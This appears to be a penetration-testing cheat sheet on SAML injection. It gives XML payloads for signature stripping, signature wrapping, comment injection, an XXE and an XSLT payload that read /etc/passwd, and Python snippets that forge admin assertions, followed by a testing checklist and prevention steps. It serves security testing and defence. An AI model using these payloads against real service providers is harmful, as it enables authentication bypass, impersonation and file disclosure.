# SAML Injection

## Description
SAML (Security Assertion Markup Language) is an XML-based authentication protocol. Vulnerabilities in SAML implementations can allow attackers to bypass authentication, impersonate users, or escalate privileges through signature manipulation, XML attacks, and assertion forgery.

## SAML Flow Overview

```
1. User requests access to Service Provider (SP)
2. SP redirects to Identity Provider (IdP) with SAML Request
3. User authenticates with IdP
4. IdP returns SAML Response with Assertion
5. SP validates Assertion and grants access
```

## Vulnerability Categories

### 1. Signature Stripping
Remove the signature and see if the SP still accepts the assertion.

```xml
<!-- Before: Signed SAML Response -->
<samlp:Response>
    <saml:Assertion>
        <saml:Subject>admin@target.com</saml:Subject>
    </saml:Assertion>
    <ds:Signature>...</ds:Signature>
</samlp:Response>

<!-- After: Signature removed -->
<samlp:Response>
    <saml:Assertion>
        <saml:Subject>attacker@evil.com</saml:Subject>
    </saml:Assertion>
</samlp:Response>
```

### 2. Signature Wrapping (XSW) Attacks

#### XSW1 - Duplicate Assertion
```xml
<samlp:Response>
    <!-- Malicious unsigned assertion (processed) -->
    <saml:Assertion ID="evil">
        <saml:Subject>admin@target.com</saml:Subject>
    </saml:Assertion>
    <!-- Original signed assertion (signature validates against this) -->
    <saml:Assertion ID="legit">
        <saml:Subject>user@target.com</saml:Subject>
        <ds:Signature>
            <ds:Reference URI="#legit"/>
        </ds:Signature>
    </saml:Assertion>
</samlp:Response>
```

#### XSW2 - Assertion in Extensions
```xml
<samlp:Response>
    <samlp:Extensions>
        <!-- Original signed assertion moved here -->
        <saml:Assertion ID="legit">
            <ds:Signature/>
        </saml:Assertion>
    </samlp:Extensions>
    <!-- Malicious assertion -->
    <saml:Assertion ID="evil">
        <saml:Subject>admin@target.com</saml:Subject>
    </saml:Assertion>
</samlp:Response>
```

#### XSW3-XSW8
Various placements of signed vs unsigned assertions:
- Moving signed assertion to different locations
- Using XML comments to hide original
- Nested assertions
- Object element wrapping

### 3. XML Comment Injection

```xml
<!-- Before -->
<NameID>user@target.com</NameID>

<!-- After - comment breaks parsing -->
<NameID>admin@target.com<!---->user@target.com</NameID>
```

Some XML parsers may extract `admin@target.com` while signature covers full string.

### 4. Self-Signed Certificate

```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Sign SAML assertion with attacker's certificate
# If SP doesn't validate certificate chain, attack succeeds
```

### 5. XML External Entity (XXE)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
    <saml:Assertion>
        <saml:Subject>&xxe;</saml:Subject>
    </saml:Assertion>
</samlp:Response>
```

### 6. XSLT Injection

```xml
<samlp:Response>
    <ds:Signature>
        <ds:SignedInfo>
            <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
                <xsl:stylesheet version="1.0">
                    <xsl:template match="/">
                        <xsl:copy-of select="document('/etc/passwd')"/>
                    </xsl:template>
                </xsl:stylesheet>
            </ds:Transform>
        </ds:SignedInfo>
    </ds:Signature>
</samlp:Response>
```

## Exploitation Techniques

### Intercepting and Modifying SAML Response

```bash
# 1. Intercept SAML Response in Burp
# 2. Decode Base64
echo "PHNhbWxwOl..." | base64 -d

# 3. Modify assertion
# 4. Re-encode
echo '<samlp:Response>...</samlp:Response>' | base64

# 5. Forward modified response
```

### Forging Unsigned Assertion

```python
# Create forged SAML assertion
from lxml import etree

assertion = etree.Element('Assertion')
subject = etree.SubElement(assertion, 'Subject')
nameid = etree.SubElement(subject, 'NameID')
nameid.text = 'admin@target.com'

# Encode and send
import base64
encoded = base64.b64encode(etree.tostring(assertion))
```

### Testing Signature Validation

```bash
# 1. Get valid SAML Response
# 2. Modify NameID value
# 3. Keep signature unchanged
# 4. If accepted, signature not properly validated
```

## Tools

### SAML Raider (Burp Extension)
```
1. Install from BApp Store
2. Intercept SAML Response
3. Send to SAML Raider
4. Test attacks:
   - Remove Signature
   - XSW attacks
   - Certificate cloning
   - XXE injection
```

### SAMLTool
```bash
# Decode SAML
python samltool.py -d "Base64SAMLResponse"

# Encode SAML
python samltool.py -e "SAMLXml"

# Sign with custom cert
python samltool.py -s saml.xml -c cert.pem -k key.pem
```

### Manual XML Manipulation
```python
from lxml import etree

# Parse SAML Response
saml = etree.fromstring(base64.b64decode(saml_response))

# Find and modify NameID
nameid = saml.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}NameID')
nameid.text = 'admin@target.com'

# Output modified SAML
modified = base64.b64encode(etree.tostring(saml))
```

## CVEs

### XML Comment Processing
- CVE-2017-11427 (OneLogin)
- CVE-2017-11428 (Duo)
- CVE-2017-11429 (Clever)
- CVE-2018-7340 (Shibboleth)
- CVE-2018-0489 (Salesforce)

## Testing Checklist

- [ ] Test signature removal
- [ ] Test XSW1-XSW8 attacks
- [ ] Test XML comment injection
- [ ] Test self-signed certificate acceptance
- [ ] Test XXE injection
- [ ] Test XSLT injection
- [ ] Check for certificate validation
- [ ] Test assertion replay
- [ ] Check NotBefore/NotOnOrAfter validation
- [ ] Test InResponseTo validation

## Payloads

### Signature Stripping
```xml
<!-- Remove entire ds:Signature element -->
```

### NameID Manipulation
```xml
<NameID>admin@target.com</NameID>
```

### Comment Injection
```xml
<NameID>admin@target.com<!----->user@target.com</NameID>
```

### XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<NameID>&xxe;</NameID>
```

## Prevention

```
1. Validate signatures on both Response and Assertion
2. Validate certificate chain, not just signature
3. Use allowlist of trusted IdP certificates
4. Verify InResponseTo matches original request
5. Check NotBefore and NotOnOrAfter timestamps
6. Reject responses with missing signatures
7. Disable DTD processing (prevent XXE)
8. Use canonical XML for signature validation
9. Validate assertion was intended for your SP
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SAML%20Injection
- https://portswigger.net/web-security/saml
- https://research.nccgroup.com/2021/03/29/saml-xml-injection/
